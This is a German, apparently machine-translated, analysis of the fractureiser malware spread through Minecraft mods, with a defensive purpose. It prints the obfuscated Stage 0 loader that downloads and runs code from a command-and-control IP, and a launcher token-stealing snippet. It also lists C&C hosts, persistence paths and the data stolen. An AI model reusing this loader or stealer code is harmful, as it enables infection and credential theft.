# Technische Informationen

## Verteilung

Für einige Modpacks wurden ohne das Wissen der Autoren Updates veröffentlicht, die eine Abhängigkeit von bösartigen Mods hinzufügen. Diese Modpack-Updates wurden sofort nach dem Hochladen archiviert, was bedeutet, dass sie *nicht in der Web-UI angezeigt werden, sondern nur über die API.

Die Upload-Daten der bösartigen Mods liegen mehrere Wochen in der Vergangenheit. Die meisten von ihnen wurden
von Einwegkonten mit eindeutig automatisch generierten Namen hochgeladen und waren wahrscheinlich der Ursprung der
der Infektion. Luna Pixel Studios wurde kompromittiert, weil ein Entwickler eine dieser Mods testete, da es sich um einen interessanten neuen Upload handelte.

### Bekannte betroffene Mods & Plugins

Hinweis: Diese Liste ist **nicht vollständig**. Sie wurde in den ersten Tagen der Untersuchung erstellt
Untersuchung erstellt und wir haben schnell gemerkt, dass der Umfang viel größer ist, als wir dachten,
was die Verfolgung einzelner Fälle sinnlos macht. Sie wird hier für historische Zwecke belassen.

Siehe auch CurseForge's
[list](https://support.curseforge.com/en/support/solutions/articles/9000228509-june-2023-infected-mods-detection-tool/)
der betroffenen Projekte

|mod/plugin|link(s)|SHA1|"Uploader"|
|---|---|---|---|
|Skyblock Core|[www.curseforge.com/minecraft/mc-mods/skyblock-core/files/4570565](https://www.curseforge.com/minecraft/mc-mods/skyblock-core/files/4570565) |`33677CA0E4C565B1F34BAA74A79C09A3B690BF41`|Luna Pixel Studios|
|Dungeonz|[legacy.curseforge.com/minecraft/mc-mods/dungeonx/files/4551100 (removed)](https://legacy.curseforge.com/minecraft/mc-mods/dungeonx/files/4551100) |`2DB855A7F40C015F8C9CA7CBAB69E1F1AAFA210B`|fractureiser|
|Haven Elytra|[dev.bukkit.org/projects/havenelytra/files/4551105 (removed)](https://dev.bukkit.org/projects/havenelytra/files/4551105)   [legacy.curseforge.com/minecraft/bukkit-plugins/havenelytra/files/4551105 (removed)](https://legacy.curseforge.com/minecraft/bukkit-plugins/havenelytra/files/4551105) |`284A4449E58868036B2BAFDFB5A210FD0480EF4A`|fractureiser|
|Vault Integrations|[www.curseforge.com/minecraft/mc-mods/vault-integrations-bug-fix/files/4557590 (removed)](https://www.curseforge.com/minecraft/mc-mods/vault-integrations-bug-fix/files/4557590)|`0C6576BDC6D1B92D581C18F3A150905AD97FA080`|simpleharvesting82|
|AutoBroadcast|[www.curseforge.com/minecraft/mc-mods/autobroadcast/files/4567257 (removed)](https://www.curseforge.com/minecraft/mc-mods/autobroadcast/files/4567257)|`C55C3E9D6A4355F36B0710AB189D5131A290DF26`|shyandlostboy81|
|Museum Curator Advanced|[www.curseforge.com/minecraft/mc-mods/museum-curator-advanced/files/4553353 (removed)](https://www.curseforge.com/minecraft/mc-mods/museum-curator-advanced/files/4553353)|`32536577D5BB074ABD493AD98DC12CCC86F30172`|racefd16|
|Vault Integrations Bug fix|[www.curseforge.com/minecraft/mc-mods/vault-integrations-bug-fix/files/4557590 (removed)](https://www.curseforge.com/minecraft/mc-mods/vault-integrations-bug-fix/files/4557590)|`0C6576BDC6D1B92D581C18F3A150905AD97FA080`|simplyharvesting82
|Floating Damage|[dev.bukkit.org/projects/floating-damage (removed)](https://dev.bukkit.org/projects/floating-damage)|`1d1aaccdc13244e980c0c024610ecc77ea2674a33a52129edf1bb4ce3b2cc2fc`|mamavergas3001
|Display Entity Editor|[www.curseforge.com/minecraft/bukkit-plugins/display-entity-editor/files/4570122 (removed)](https://www.curseforge.com/minecraft/bukkit-plugins/display-entity-editor/files/4570122)|`A4B6385D1140C111549D95EAB25CB51922EEFBA2`|santa_faust_2120

Darkhax hat das geschickt: https://gist.github.com/Darkhax/d7f6d1b5bfb51c3c74d3bd1609cab51f

weitere Kandidaten: Sophisticated Core, Dramatic Doors, Moonlight lib, Union lib

## Stufe 0 (Infizierte Mod-Jars)

Betroffene Mods oder Plugins haben eine neue `static void`-Methode in ihre Hauptklasse eingefügt, und ein Aufruf dieser Methode wird in den statischen Initialisierer dieser Klasse eingefügt. Für DungeonZ heißt die Methode `_d1385bd3c36f464882460aa4f0484c53` und existiert in `net.dungeonz.DungeonzMain`. Für Skyblock Core heißt die Methode `_f7dba6a3a72049a78a308a774a847180` und ist in `com.bmc.coremod.BMCSkyblockCore` eingefügt. Für HavenElytra wird der Code direkt in den sonst nicht verwendeten statischen Initialisierer von `valorless.havenelytra.HavenElytra` eingefügt.

Der Code der Methode ist verschleiert, indem `new String(new byte[]{...})` anstelle von String-Literalen verwendet wird.

Aus dem D3SL-Beispiel von "Create Infernal Expansion Plus", einer nachgeahmten Version von "Create Infernal Expansion Compat" mit in die Haupt-Mod-Klasse eingefügter Malware:
```java
static void _1685f49242dd46ef9c553d8af1a4e0bb() {
  Class.forName(new String(new byte[] {
      // "Utility"
    85, 116, 105, 108, 105, 116, 121
  }), true, (ClassLoader) Class.forName(new String(new byte[] {
      // "java.net.URLClassLoader"
    106, 97, 118, 97, 46, 110, 101, 116, 46, 85, 82, 76, 67, 108, 97, 115, 115, 76, 111, 97, 100, 101, 114
  })).getConstructor(URL[].class).newInstance(new URL[] {
    new URL(new String(new byte[] {
        // "http"
      104, 116, 116, 112
    }), new String(new byte[] {
        // "85.217.144.130"
      56, 53, 46, 50, 49, 55, 46, 49, 52, 52, 46, 49, 51, 48
    }), 8080, new String(new byte[] {
        // "/dl"
        47, 100, 108
        }))
  })).getMethod(new String(new byte[] {
      // "run"
    114, 117, 110
  }), String.class).invoke((Object) null, "-114.-18.38.108.-100");
}
```

Dies:
1. Erzeugt einen `URLClassLoader` mit der URL `http://[85.217.144.130:8080]/dl` ([shodan](https://www.shodan.io/host/85.217.144.130))
2. Lädt die Klasse `Utility` aus dem Classloader und holt sich den Code aus dem Internet
3. Ruft die Methode `run` auf `Utility` auf und übergibt ein String-Argument, das für jeden infizierten Mod (!) unterschiedlich ist. Z.B..
    * Skyblock Core: "`-74.-10.78.-106.12`"
    * Dungeonz: "`114.-18.38.108.-100`"
    * HavenElytra: "`-114.-18.38.108.-100`"
    * Vault Integrations: "`-114.-18.38.108.-100`"

Die übergebenen Ziffern werden von Stufe 1 als Bytes geparst und in eine Datei namens ".ref" geschrieben. Sie scheinen eine Möglichkeit für den Autor zu sein, Infektionsquellen zu verfolgen.

Die Erstellung des Classloaders ist fest mit dieser URL kodiert und verwendet nicht die Cloudflare-URL, die Stage 1 verwendet. Da diese IP jetzt offline ist, bedeutet dies, dass die Nutzdaten der Stufe 0, die uns derzeit bekannt sind, nicht mehr funktionieren.

## Stufe 1 (`dl.jar`)

SHA-1: `dc43c4685c3f47808ac207d1667cc1eb915b2d82`

[Dekompilierte Dateien der Malware können hier gefunden werden](../decomp).

Das erste, was `Utility.run` macht, ist zu prüfen, ob die Systemeigenschaft `neko.run` gesetzt ist. Wenn ja, wird es *sofort die Ausführung beenden*. Wenn nicht, wird sie auf eine leere Zeichenkette gesetzt und fortgesetzt. Dies scheint der Versuch der Malware zu sein, eine mehrfache Ausführung zu vermeiden, z. B. wenn sie mehrere Mods infiziert hat. *Dies kann nicht als Killswitch verwendet werden, da Stage1 aus dem Internet heruntergeladen wird und sich ändern kann.

Er versucht, `85.217.144.130` und eine Cloudflare Pages Domain (`https://files-8ie.pages.dev/ip`) zu kontaktieren. Es wurden bereits Missbrauchsmeldungen gesendet. Die Pages-Domain wird verwendet, um die IP des C&C-Servers abzurufen, wenn die erste IP nicht mehr antwortet - die URL antwortet mit einer binären Darstellung einer IPv4-Adresse.

*Die IP des C&C-Servers wurde nach einem Missbrauchsbericht an den Server-Provider nullgeleitet. Wir werden die Cloudflare-Seite im Auge behalten müssen, um zu sehen, ob ein neuer C&C-Server aufgesetzt wird, ich kann mir nicht vorstellen, dass sie das nicht eingeplant haben *Danke an Serverion für die schnelle Antwort.

*Die Domäne von Cloudflare Pages wurde gekündigt. Es gibt einen neuen C&C-Server unter der Adresse 107.189.3.101.

Stufe 1 versucht dann, sich im System festzusetzen, indem es Folgendes tut:
1. Herunterladen von Stufe 2 (lib.jar auf Linux, libWebGL64.jar auf Windows) vom Server
2. Stufe 2 wird beim Start automatisch ausgeführt:
* Unter Linux wird versucht, systemd-Unit-Dateien in `/etc/systemd/system` oder `~/.config/systemd/user` zu platzieren.
    * Die Unit-Datei, die im User-Ordner abgelegt wird, funktioniert nie, weil sie versucht, `multi-user.target` zu verwenden, das für User-Units nicht existiert.
* Unter Windows wird versucht, die Registry zu ändern
  (`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`) zu ändern, um sich selbst zu starten, oder
  wenn das nicht möglich ist, versucht er, sich selbst zum Ordner "Windows-Startmenü" (Programme) hinzuzufügen.

## Stufe 2 (`lib.jar` oder `libWebGL64.jar`)

Bekannte sha1-Hashes:
* `52d08736543a240b0cbbbf2da03691ae525bb119`
* `6ec85c8112c25abe4a71998eb32480d266408863` (D3SLs früherer Upload)

Stufe 2 ist mit einer Demoversion des Allatori Obfuscators verschlüsselt. Seine Hauptklasse heißt `Bootstrap`.
Sie enthält zusätzlich eine weitere Klasse mit dem Namen `h`, die eine einfache Kommunikationsklasse zu sein scheint, aber ansonsten leer ist
ansonsten leer ist. Einen Versuch, den Quellcode zu rekonstruieren:
https://gist.github.com/SilverAndro/a992f85bec29bb248c354ccf5d2206fe

Wenn es gestartet wird, tut es folgendes:
1. Öffnet Port `9655` und fügt einen Shutdown-Hook hinzu, um den Port zu schließen, wenn die JVM geschlossen wird.
2. Es sucht sich selbst auf der Festplatte und arbeitet neben sich selbst
3. Wenn `.ref` existiert, liest es den Identifizierungsschlüssel aus der Datei
4. Startet eine Schleife:
    1. Prüft mit `https://[files-8ie.pages.dev]:8083/ip` den Server und versucht, eine Verbindung zu ihm herzustellen
    2. Empfängt ein Flag, das angibt, ob die Aktualisierungsprüfung fortgesetzt werden soll, und wirft, wenn dies nicht der Fall ist (an den Server auf Port `1338` gemeldet)
    3. Wenn ja, empfängt er einen Hash und vergleicht ihn mit der Datei `client.jar`, falls sie existiert, und sendet ein Byte zurück, ob er sie aktualisieren will
    4. Wenn ja, empfängt und überschreibt/erstellt `client.jar` und versteckt es mit Hilfe von Dateiattributen
    5. Lädt und ruft die statische Methode `dev.neko.nekoclient.Client#start(InetAddress, refFileBytes)` auf
    6. Wartet für 5 Sekunden

## Stufe 3 (`client.jar`)

sha-1: `c2d0c87a1fe99e3c44a52c48d8bcf65a67b3e9a5`
sha-1: `e299bf5a025f5c3fff45d017c3c2f467fa599915`

client.jar" ist ein unglaublich verschleiertes und komplexes Codebündel und enthält sowohl Java- als auch nativen Code.

Es enthält eine native Nutzlast `hook.dll`, dekompiliert: https://gist.githubusercontent.com/NotNite/79ab1e5501e1ef109e8030059356b1b8/raw/c2102bf5ff74275ac44c2200d5121bfff652fd49/hook.dll.c

Es gibt zwei native Funktionen, die von Java aus aufgerufen werden sollen, da sie über JNI aufrufbar sind:
* `__int64 __fastcall Java_dev_neko_nekoclient_api_windows_WindowsHook_retrieveClipboardFiles(__int64 a1);`
* `__int64 __fastcall Java_dev_neko_nekoclient_api_windows_WindowsHook_retrieveMSACredentials(__int64 a1);`

Die Analyse zeigt, dass diese Aufrufe das tun, was auf dem Zettel steht:
* Inhalt der Zwischenablage lesen
* Stehlen von Microsoft-Konto-Anmeldeinformationen

Es gibt auch Hinweise auf Code, der versucht, Folgendes zu tun:
* Suche nach *allen* JAR-Dateien auf dem System, die wie Minecraft-Mods aussehen (durch Erkennung von
  Forge/Fabric/Quilt/Bukkit), oder [Deklaration einer Main
  Klasse](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/Client.java#L235-L244)
  (die meisten einfachen Java-Programme) und versuchen, Stage 0 in sie einzuschleusen
* Stehlen von Cookies und Anmeldeinformationen für viele Webbrowser
* Ersetzen von Kryptowährungsadressen in der Zwischenablage durch Alternativen, die vermutlich im Besitz des Angreifers sind
* Stehlen von Discord-Anmeldeinformationen
* Stehlen von Microsoft- und Minecraft-Anmeldeinformationen von einer Vielzahl von Launchern
* Stehlen von Krypto-Wallets

Die Jars werden wie folgt heuristisch als Minecraft-Mods oder -Plugins erkannt:
* Forge (`dev/neko/e/e/e/A`): Die Malware versucht, die `@Mod`-Annotation zu finden, die in jeder Mod erforderlich ist.
* Bukkit (`dev/neko/e/e/e/C`): Die Malware prüft, ob eine Klasse die `JavaPlugin`-Klasse von Bukkit erweitert
* Fabric/Quilt (`dev/neko/e/e/e/i`): Die Malware prüft, ob eine Klasse `ModInitializer` implementiert
* Bungee (`dev/neko/e/e/e/l`): Der Schädling prüft, ob eine Klasse die Klasse `Plugin` von Bungee erweitert
* Vanilla (`dev/neko/e/e/e/c`): Die Malware prüft, ob die Haupt-Client-Klasse `net.minecraft.client.main.Main` existiert

## Stufe 3 (`unobf-client.jar`)

Um 2023-06-07 14:20 UTC wurde die Stufe 3 `client.jar` scheinbar versehentlich durch eine unverschlüsselte Version ersetzt. Das Archiv dazu: https://github.com/clrxbl/NekoClient

Dies bestätigt das vermutete Verhalten bzw. die Beweise aus der Analyse der vorherigen, verschlüsselten `client.jar`.

### (Selbst-)Replikation

Die Replikation erfolgt durch die automatische Einarbeitung von Klassen in jar-Dateien über das gesamte Dateisystem auf dem lokalen Rechner. Jede jar-Datei, die Klassen enthält, die bestimmte Kriterien erfüllen, ist für eine Infektion geeignet. Der Prozess des Scannens des lokalen Dateisystems und des Einfügens von bösartigem Code kann hier nachgelesen werden: [`dev/neko/nekoclient/Client.start(InetSocketAddress, byte[])`](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/Client.java#L273)

Die Kriterien, nach denen der Prozess sucht, sind hier zu finden: [`dev/neko/nekoinjector/template/impl`](https://github.com/clrxbl/NekoClient/tree/main/dev/neko/nekoinjector/template/impl)

* `BungeecordPluginTemplate` sucht nach der Schnittstelle `net/md_5/bungee/api/plugin/Plugin` in Klassen
* `FabricModTemplate` sucht in Klassen nach der Schnittstelle `net/fabricmc/api/ModInitializer`.
* `ForgeModTemplate` sucht nach der Annotation `net/minecraftforge/fml/common/Mod` in Klassen
* `MinecraftClientTemplate` sucht nach der Existenz von `net/minecraft/client/main/Main.class` und `net/minecraft/client/gui/GuiMultiplayer.class` im Jar 
* `SpigotPluginTemplate` sucht nach dem Supertyp `org/bukkit/plugin/java/JavaPlugin` in Klassen
* Wenn keine der obigen Angaben auf die Klasse zutrifft, wird versucht, die Hauptklasse der Jar-Datei zu infizieren (https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/Client.java#L235-L244) - sofern eine solche existiert.

Der eingeschleuste bösartige Code ist die Hintertürlogik (Backdoor), die in Stufe 0 zu sehen ist. Die Injektion funktioniert so, dass der bösartige Code in der Klasse "Loader" in einer statischen Methode deklariert wird. Die benachbarte Klasse "Injector" ist dafür verantwortlich, den Code aus "Loader" zu extrahieren und ihn in neue, zu infizierende Klassen einzufügen. Der Rückgabewert von `Injector.loadInstallerNode(...)` ist ein `MethodNode`, der den Infektionsprozess selbst beschreibt. Jetzt müssen sie nur noch diese Methode zu der anvisierten Klasse hinzufügen. Zurück im [`dev/neko/nekoclient/Client.start(InetSocketAddress, byte[])`](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/Client.java#L272) rufen sie `Entry.inject(MethodNode)` auf, um dies zu erreichen. Um sicherzustellen, dass die bösartige Methode aufgerufen wird, fügt diese `inject`-Methode dem statischen Initialisierer der Zielklasse eine Logik hinzu, die die hinzugefügte Methode aufruft. Da der statische Initialisierer beim ersten Laden der Klasse ausgeführt wird und es sich bei der Zielklasse um ein Plugin/Mod handelt, ist davon auszugehen, dass dieser Code immer von Benutzern ausgelöst wird, die infizierte Modpacks oder Server ausführen. Danach packen sie die Jar-Datei mit der neu infizierten Zielklasse neu.

### Anti-Sandbox-Tricks

Etwas, das in JVM-Malware nicht häufig vorkommt, ist eine Klasse mit dem Namen `VMEscape`. Sie prüft, ob sie sich in einer Windows-Sandbox-Umgebung befindet, indem sie prüft, ob der aktuelle Benutzer `WDAGUtilityAccount` ist, der Teil des [Windows Defender Application Guard](https://www.majorgeeks.com/content/page/what_is_the_wdagutilityaccount.html) ist. Wenn diese Bedingung erfüllt ist, wird versucht, das Sandbox-System zu umgehen.

Der Prozess läuft in etwa wie folgt ab:

- Starten eines sich wiederholenden Threads, um die folgenden Aktionen auszuführen:
  - Erstellen eines temporären Verzeichnisses mit `Files.createTempDirectory(...)`
  - Iterieren über `FileDescriptor`-Einträge in der System-Zwischenablage _(Vermutlich wird dies auf den Inhalt des Hosts zugreifen)_ 
  - Erstellen einer Verknüpfung, die wie die Originaldatei aussieht _(mit Symbolen von SHELL32)_, aber stattdessen die Malware aufruft
  - Fügt diese Verknüpfung in die Zwischenablage ein und überschreibt den Verweis auf die Originaldatei.

Wenn ein Benutzer also eine Datei kopiert und an anderer Stelle einfügen will, fügt er stattdessen eine Verknüpfung ein, die wie die gewünschte Datei aussieht, aber in Wirklichkeit die Malware ausführt.

### Datendiebstahl

**MSA-Token**: Da diese Mod auf Minecraft-Mods abzielt, ist es nur natürlich, dass sie versucht, das MSA-Token zu stehlen, mit dem man sich bei Minecraft anmeldet. Einige Launcher speichern diese Daten in einer lokalen Datei, aus der diese Malware versucht, sie zu lesen. Dies betrifft eine Reihe von Launchern wie z.B.:

* Der Vanilla/Mojang Launcher
* Der alte Vanilla/Mojang-Launcher
* PolyMC/Prisma
* Technic
* Feather
* LabyMod (< v3.9.59)
* Und jedes MSA-Token, das im [Windows Credential Manager](https://support.microsoft.com/en-us/windows/accessing-credential-manager-1b5c916a-6a16-889f-8581-fc16e8165ac0) gefunden wird.

Die Auslese-Logik (zu sehen in [`dev/neko/nekoclient/api/stealer/msa/impl/MSAStealer.java`](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/api/stealer/msa/impl/MSAStealer.java)) sieht bei einer Reihe von Objekten ähnlich aus, da sie diese Daten in ähnlicher Weise speichern. Hier ist zum Beispiel der laby-mod Code:
```java
private static void retrieveRefreshTokensFromLabyMod(List<RefreshToken> refreshTokens) throws IOException {
	String appdata = System.getenv("APPDATA");
	if (Platform.isWindows() || Objects.isNull(appdata)) {
		Path path = appdata == null ? null : Paths.get(appdata, ".minecraft", "LabyMod", "accounts.json");
		if (Files.isReadable(path)) {
			extractRefreshTokensFromLabyModLauncher(refreshTokens, Json.parse(Files.readString(path)).asObject());
		}
	}
}
```
Der Code zum Abrufen von Token aus Feather/PolyMC/Prism ist im Wesentlichen identisch.

Der Unterschied zu den Vanilla Launchern besteht darin, dass die Json-Datei durch eine zusätzliche Verschlüsselungsschicht geschützt ist.

Die Änderung von dieser Strategie zu technic besteht darin, dass technic Anmeldeinformationen unter Verwendung von Javas eingebauter Objektserialisierung speichert und den Typ "com.google.api.client.auth.oauth2.StoredCredential" umhüllt.

**Diskord-Tokens**: Jeder hat schon einmal einen Token-Dieb gesehen. Betroffen sind der Standard-Client, Canary-, ptb- und Lightcord-Clients.

**Cookies & Gespeicherte Anmeldeinformationen**: Stiehlt gespeicherte Cookies und Anmeldeinformationen, die in den betroffenen Browsern gespeichert sind. Relevante Quelle: [`dev/neko/nekoclient/api/stealer/browser/impl/BrowserDataStealer.java`](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/api/stealer/browser/impl/BrowserDataStealer.java)

- Mozilla Firefox
  - Waterfox
  - Pale Moon
  - SeaMonkey
- Chrome
  - Edge
  - Brave
  - Vivaldi
  - Yandex
  - Slimjet
  - CentBrowser
  - Comodo
  - Iridium
  - UCBrowser
  - Opera
    - Beta
    - Developer
    - Stable
    - GX
    - Crypto
  - CryptoTab

## Stufe 3b (`dummyloader3.jar`)

Stufe 3 wurde durch ein anderes jar ersetzt, einige Zeit nachdem der zweite C&C-Server eingerichtet wurde.

Dabei scheint es sich nur um den SkyRage-Updater zu handeln, eine weitere Minecraft-Malware, die auf Blackspigot abzielt.

### Persistenz
- Windows: Taskplaner `MicrosoftEdgeUpdateTaskMachineVM`, Datei `%AppData%\..\LocalLow\Microsoft\Internet Explorer\DOMStore\microsoft-vm-core`
- Linux: "/bin/vmd-gnu", "/etc/systemd/system/vmd-gnu.service", Dienst "vmd-gnu

### Verbindungen
- C&C-Server: `connect.skyrage.de`
- Herunterladen: `hxxp://t23e7v6uz8idz87ehugwq.skyrage.de/qqqqqqqqq`

### Actions
- `qqqqqqqqqq` jar extrahiert alle möglichen Informationen (Browser-Cookies, Discord, Minecraft, Epic Games, Steam-Login, auch einige Dinge über Krypto-Wallets und Passwort-Pamanger), die jar auf den C&C-Server hochlädt
- ersetzt die Krypto-Münzen-Adressen in der Zwischenablage mit der Adresse, die er von "95.214.27.172:18734" erhalten hat
- Persistenz (siehe oben)
- enthält Auto-Updater, aktuelle Version ist 932 (`hxxp://t23e7v6uz8idz87ehugwq.skyrage.de/version`)

### Mappings

Dies sind die Zuordnungen für dieses Beispiel, die über Enigma oder ein anderes Tool, das Engima-Zuordnungen unterstützt, angewendet werden können.
```
CLASS D Chat
CLASS E ChatChain
CLASS E$a ChatChain$ChainLink
CLASS F ClientChat
CLASS G EncryptionRequest
CLASS H EncryptionResponse
CLASS H$a EncryptionResponse$EncryptionData
CLASS J KeepAlive
CLASS L LoginPayloadResponse
CLASS O PluginMessage
CLASS O$1 BungeeCordProtocolVersionMapFunction
CLASS P SetCompression
CLASS R StatusResponse
CLASS T CryptocurrencyClipboardLogger
CLASS T$1 CryptocurrencyClipboardLogger$LowLevelKeyboardHook
CLASS U AutoRunPersistence
CLASS V InputStreamFileWriter
CLASS W OperatingSystem
CLASS X AutoUpdater
CLASS Y StacktraceSerializer
CLASS a MalwareClientConnectionHandler
CLASS b Main
    FIELD a intconst I
    FIELD a string0 Ljava/lang/String;
    FIELD a ipAddress Ljava/net/InetSocketAddress;
CLASS g MinecraftBot
CLASS h MinecraftBot2
CLASS o MinecraftFriendlyByteBuf
CLASS s MinecraftIPAddressResolver
CLASS t MinecraftPacketDecoder
CLASS y MinecraftPacketEncryption
```

### Anti-Dekompilierung

Dieses Beispiel scheint technische Besonderheiten in der Klassendatei zu missbrauchen, um Decompiler-Tools zum Absturz zu bringen. Solche Ausnutzungen können mit [CAFED00D](https://github.com/Col-E/CAFED00D) behoben werden, einem Bytecode-Parser, der missgebildete Attribute herausfiltert. Danach bleibt nur noch das Problem der grundlegenden Verschleierung durch die Allatori-Demo.

# Andere Dinge

Weitere Einzelheiten sind im Dokument zur Live-Umkehrung von Stufe 3 zu finden: https://hackmd.io/5gqXVri5S4ewZcGaCbsJdQ

Als der zweite C&C-Server in Betrieb genommen wurde, wurde versehentlich eine entschleierte Version von Stufe 3
versehentlich für etwa 40 Minuten serviert.

Der Hauptserver für die Nutzlast ~~ist~~ *wurde* (wurde abgeschaltet) bei Serverion, einem Unternehmen in den Niederlanden, gehostet.

Der neue C&C-Server wurde ebenfalls abgeschaltet. _2023-06-07 18:51 UTC_

Abgesehen von einem HTTP-Server auf Port 80/443 und einem SSH-Server auf Port 22 waren die folgenden Ports auf `85.217.144.130` und `107.189.3.101` offen:

* 1337
* 1338 (ein Port, auf den in der Datei von Stufe 1 für die Erstellung einer neuen Debugger-Verbindung verwiesen wird)
* 8081 (dies ist ein WebSocket-Server - keine offensichtliche Funktion im Moment, kein Verweis in einem bösartigen Code)
* 8082 (niemand hat hier etwas herausgefunden, kein Verweis in bösartigem Code)
* 8083 (kontaktiert von Stufe 1)

Seltsamerweise steht auf der Bukkit-Seite von fractureiser "Last active Sat, Jan, 1 2000 00:00:00" https://dev.bukkit.org/members/fractureiser/projects/

## Beispiele

Bitte fraget im IRC-Chat nach Lese- oder Lese-/Schreibzugang zu den Beispielen. Der Quellcode des dekompilierten Stufe 3 Clients ist hier verfügbar: https://github.com/clrxbl/NekoClient

## Folgemaßnahmen
Es ist zwar noch etwas früh, um von langfristigen Folgemaßnahmen zu sprechen, aber dieses ganze Debakel hat einige kritische Schwachstellen im modifizierten Minecraft-Ökosystem ans Licht gebracht. In diesem Abschnitt geht es nur um ein Brainstorming über diese und wie wir sie verbessern können.

#### 1. Die Überprüfung in den Mod-Repositories ist unzureichend

Was genau tun CurseForge und Modrinth, wenn sie eine Mod "überprüfen"? Wir sollten das als Gemeinschaft wissen, anstatt uns auf Sicherheit durch Unklarheit zu verlassen.
Sollten wir eine Art statische Analyse durchführen? (williewillus hat hier ein paar Ideen)

#### 2. Fehlende Code-Signierung für Mods

Im Gegensatz zur Softwareindustrie im Allgemeinen werden Mods, die veröffentlicht und in Repositories hochgeladen werden, normalerweise nicht mit einem Signierschlüssel signiert, der beweist, dass der Besitzer des Schlüssels die Mod hochgeladen hat. Die Signierung und ein separater Schlüsselverteilungs-/Vertrauensmechanismus verhindern, dass CurseForge-Konten kompromittiert werden.

Dies führt jedoch zu dem größeren Problem, wie man das Vertrauen in den Schlüssel ableiten kann, da die Tatsache, dass "dieser Jar diese Signatur hat", von CurseForge/Modrinth auf eine standardisierte Art und Weise kommuniziert werden muss, damit Lader oder Benutzer die Signaturen verifizieren können.
Forge hat vor vielen Jahren versucht, Signaturen einzuführen, und es wurde nur begrenzt angenommen.

#### 3. Ein Mangel an reproduzierbaren Builds

Minecraft Toolchains sind ein Chaos, und Builds sind normalerweise nicht reproduzierbar. Es ist üblich, dass Buildskripte nicht angepinnte -SNAPSHOT-Versionen von zufälligen Gradle-Plugins abrufen und diese verwenden, was zu Artefakten führt, die nicht reproduzierbar und somit nicht auditierbar sind.

Ein zufälliges Gradle-Plugin als zukünftiger Angriffsvektor ist nicht auszuschließen.

#### 4. Fehlendes Sandboxing von Minecraft selbst

Java Edition Modding hatte schon immer die volle Macht von Java, und dies ist die andere Seite dieses zweischneidigen Schwertes: bösartiger Code hat weitreichende Auswirkungen.
Minecraft selbst wird nicht mit einer Sandbox betrieben, und Server werden in der Regel nicht mit einer Sandbox versehen, es sei denn, der Besitzer ist sachkundig genug, um dies zu tun.

Gutes Sandboxing ist schwierig, vor allem auf Systemen wie Linux, wo SELinux/AppArmor eine so schlechte Benutzerfreundlichkeit haben, dass niemand sie einsetzt.